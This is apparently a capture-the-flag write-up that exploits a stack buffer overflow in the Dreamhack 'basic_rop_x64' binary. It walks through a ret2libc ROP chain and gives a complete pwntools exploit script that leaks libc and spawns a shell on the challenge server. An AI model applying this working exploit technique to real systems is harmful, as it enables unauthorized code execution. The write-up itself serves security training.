---
title: "[DREAMHACK] - basic_rop_x64"
published: 2025-01-30
description: ""
image: "../image.png"
tags:
  - PWN
category: "Wargame"
draft: false
---

## Analysis

```bash
alter ^ Sol in ~/Dreamhack/basic_rop_x64
$ file basic_rop_x64_patched
basic_rop_x64_patched: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.35.so, for GNU/Linux 2.6.32, BuildID[sha1]=beee0ff502aca71479db7d481ef811576592438a, not stripped
alter ^ Sol in ~/Dreamhack/basic_rop_x64
$ checksec basic_rop_x64_patched
[*] '/home/alter/Dreamhack/basic_rop_x64/basic_rop_x64_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'.'
    Stripped:   No
```

The binary with no Canary, and 64bit. Let's take a look at the source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```

We can see that there is a buffer overflow here:

```c
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400
```

The `buf` variable just can contain 0x40 bytes but we can input `0x400` bytes. So thath let's find the offset to saved RIP

Let's use `pwndbg`:

```nasm
   0x00000000004007ba <+0>:     push   rbp
   0x00000000004007bb <+1>:     mov    rbp,rsp
   0x00000000004007be <+4>:     sub    rsp,0x50
   0x00000000004007c2 <+8>:     mov    DWORD PTR [rbp-0x44],edi
   0x00000000004007c5 <+11>:    mov    QWORD PTR [rbp-0x50],rsi
   0x00000000004007c9 <+15>:    lea    rdx,[rbp-0x40]
   0x00000000004007cd <+19>:    mov    eax,0x0
   0x00000000004007d2 <+24>:    mov    ecx,0x8
   0x00000000004007d7 <+29>:    mov    rdi,rdx
   0x00000000004007da <+32>:    rep stos QWORD PTR es:[rdi],rax
   0x00000000004007dd <+35>:    mov    eax,0x0
   0x00000000004007e2 <+40>:    call   0x40075e <initialize>
   0x00000000004007e7 <+45>:    lea    rax,[rbp-0x40]
   0x00000000004007eb <+49>:    mov    edx,0x400
   0x00000000004007f0 <+54>:    mov    rsi,rax
   0x00000000004007f3 <+57>:    mov    edi,0x0
   0x00000000004007f8 <+62>:    call   0x4005f0 <read@plt>
   0x00000000004007fd <+67>:    lea    rax,[rbp-0x40]
   0x0000000000400801 <+71>:    mov    edx,0x40
   0x0000000000400806 <+76>:    mov    rsi,rax
   0x0000000000400809 <+79>:    mov    edi,0x1
   0x000000000040080e <+84>:    call   0x4005d0 <write@plt>
   0x0000000000400813 <+89>:    mov    eax,0x0
   0x0000000000400818 <+94>:    leave
   0x0000000000400819 <+95>:    ret

```

We can see our `buf` is located in `[rbp-0x40]` we can see here:

```nasm
   0x00000000004007e7 <+45>:    lea    rax,[rbp-0x40]
   0x00000000004007eb <+49>:    mov    edx,0x400
   0x00000000004007f0 <+54>:    mov    rsi,rax
   0x00000000004007f3 <+57>:    mov    edi,0x0
   0x00000000004007f8 <+62>:    call   0x4005f0 <read@plt>
   0x00000000004007fd <+67>:    lea    rax,[rbp-0x40]
   0x0000000000400801 <+71>:    mov    edx,0x40
   0x0000000000400806 <+76>:    mov    rsi,rax
   0x0000000000400809 <+79>:    mov    edi,0x1
   0x000000000040080e <+84>:    call   0x4005d0 <write@plt>

```

So the offset from `buf` to `saved RBP` is `0x40` and we need to add more `16` bytes to overwrite the `saved RIP`

The next thing to do is leak the `libc address` because in this challenge, there is no way to read the flags except by calling the shell.

## Exploit

So there is a list we need to do

- Leak libc address using `write@plt` -> write(1, read@got, 8)

```python
pop_rdi = 0x0000000000400883
pop_rsi_r15 = 0x0000000000400881
read_plt = exe.plt["read"]
read_got = exe.got["read"]
write_plt = exe.plt["write"]
write_got = exe.got["write"]
main = exe.symbols["main"]

payload = b'A' * 0x48
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(8)
payload += p64(write_plt)
payload += p64(main)
s(payload)
```

- Calculate

```python
ru(b'A'*0x40)
leak_libc = u64(rnb(6) + b'\\0\\0')
libc.address = leak_libc - libc.sym['read']
slog("Libc base", libc.address)
```

Why `ru(b'A'*0x40)`?
-> Because our buf can only hold `0x40` bytes and when we write for the first time `write(1, buf, sizeof(buf));` it will read full `0x40` bytes of `buf`. When we `write` again it will print out what we need.

P/s: I use `libc.address` here because initially, the address in `libc` when `libc = ELF('./libc.so.6', checksec=False)` is defaulted to 0, so the address every time we `payload += p64(libc.sym['system'])` will be the `offset` of libc to the system function, not the address of the system function. I don't want that! So I set `libc.address = leak_libc - libc.sym['read']` which will be the libc base. So when I use `payload += p64(libc.sym['system'])` it will automatically add that system offset and go straight to the system function for me. For example:

```bash
>>> from pwn import *
>>> libc = ELF('./libc.so.6', checksec=False)
>>> libc.address
0
>>> libc.sym['read']
1132928
>>> hex(libc.sym['read'])
'0x114980'
>>> libc.address = 1
>>> hex(libc.sym['read'])
'0x114981'
```

- Get shell

```python
payload = b'A' * 0x48
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.sym['system'])
s(payload)
```

### Full payload

```python
#!/usr/bin/python3
from pwncus import *

context.log_level = 'debug'
exe = context.binary = ELF('./basic_rop_x64_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

def GDB(): gdb.attach(p, gdbscript='''

b*0x0000000000400819
c
''') if not args.REMOTE else None

p = remote('host3.dreamhack.games',20302 ) if args.REMOTE else process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

pop_rdi = 0x0000000000400883
pop_rsi_r15 = 0x0000000000400881
read_plt = exe.plt["read"]
read_got = exe.got["read"]
write_plt = exe.plt["write"]
write_got = exe.got["write"]
main = exe.symbols["main"]

# Leak libc address
payload = b'A' * 0x48
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(8)
payload += p64(write_plt)
payload += p64(main)
s(payload)

ru(b'A'*0x40)
leak_libc = u64(rnb(6) + b'\\0\\0')
libc.address = leak_libc - libc.sym['read']
slog("Libc base", libc.address)
slog("Libc leak",leak_libc)

# Get shell
payload = b'A' * 0x48
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.sym['system'])
s(payload)

interactive()

```

```bash
alter ^ Sol in ~/Dreamhack/basic_rop_x64
$ ./xpl.py REMOTE
[+] Opening connection to host3.dreamhack.games on port 20302: Done
[+] Libc base: 0x7fb60fc8f000
[+] Libc leak: 0x7f243740f980
[*] Switching to interactive mode
\\x00\\x00\\xc0\\x8d\\xcb\\x0f\\xb6\\x7f\\x00\\x00 \\x14\\xcd\\x0f\\xb6\\x7f\\x00\\x00p\\x06\\xd1\\x0f\\xb6\\x7f\\x00\\x006\\x06@\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00$                                                                      AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$ ls
basic_rop_x64
flag
```
